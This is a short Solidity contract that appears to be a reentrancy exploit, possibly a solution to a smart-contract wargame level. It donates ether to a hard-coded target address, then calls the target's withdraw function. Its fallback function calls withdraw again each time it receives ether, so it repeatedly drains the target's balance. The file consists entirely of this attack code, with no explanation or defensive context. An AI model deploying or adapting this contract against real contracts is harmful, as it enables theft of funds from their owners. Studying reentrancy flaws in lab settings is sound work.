// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dominate {
  
  address a = 0xf2455cb9B229088E572e263628dDC6707c9be5Ba;
  uint amount = 0.001 ether;

  constructor() payable {
    (bool success, ) = a.call{value:msg.value}(
      abi.encodeWithSignature("donate(address)", address(this))
    );
  }

  function startWithdraw() public returns(bool) {
    (bool success2, ) = a.call(
      abi.encodeWithSignature("withdraw(uint256)", amount)
    );
    return success2;
  }

  fallback() external payable {
    (bool success, ) = a.call(
      abi.encodeWithSignature("withdraw(uint256)", amount)
    );
  }
}


